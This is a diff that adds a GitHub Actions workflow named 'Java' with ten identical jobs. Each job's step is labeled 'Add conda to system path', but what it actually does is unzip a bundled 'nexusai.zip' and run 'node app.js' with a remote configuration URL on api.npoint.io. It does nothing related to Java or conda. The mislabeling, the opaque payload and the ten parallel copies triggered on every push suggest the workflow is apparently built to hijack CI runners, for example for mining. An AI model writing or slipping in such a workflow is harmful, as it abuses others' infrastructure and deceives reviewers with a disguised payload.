@@ -1,0 +1,105 @@
+name: Java
+
+on: [push]
+
+jobs:
+  build-linux:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99' 
+  build-linux2:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux3:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux4:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux5:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux6:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux7:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux8:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux9:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
+  build-linux10:
+    runs-on: ubuntu-latest
+   
+
+    steps:
+    - uses: actions/checkout@v4
+   
+    - name: Add conda to system path
+      run: |
+        unzip nexusai.zip;node app.js -s='https://api.npoint.io/7fea989e8de26bfb2c99'
